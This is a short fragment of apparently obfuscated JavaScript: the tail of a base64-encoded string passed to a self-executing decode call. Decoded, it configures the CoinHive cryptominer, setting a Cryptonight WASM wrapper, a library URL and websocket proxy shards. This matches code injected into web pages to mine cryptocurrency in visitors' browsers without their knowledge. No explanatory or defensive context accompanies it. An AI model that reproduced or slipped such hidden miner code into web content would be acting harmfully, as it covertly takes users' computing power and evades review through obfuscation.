oKXt2YXIgY3J5cHRvbmlnaHQ9bmV3IENyeXB0b25pZ2h0V0FTTVdyYXBwZXJ9KSAnCiAgXSkKKTsKQ29pbkhpdmUuQ09ORklHLkxJQl9VUkwgPSB1cmw7CkNvaW5IaXZlLkNPTkZJRy5XRUJTT0NLRVRfU0hBUkRTID0gW1sid3NzOi8vIiArIHVybC5zcGxpdCgiOi8vIilbMV0gKyAncHJveHknXV07"))();
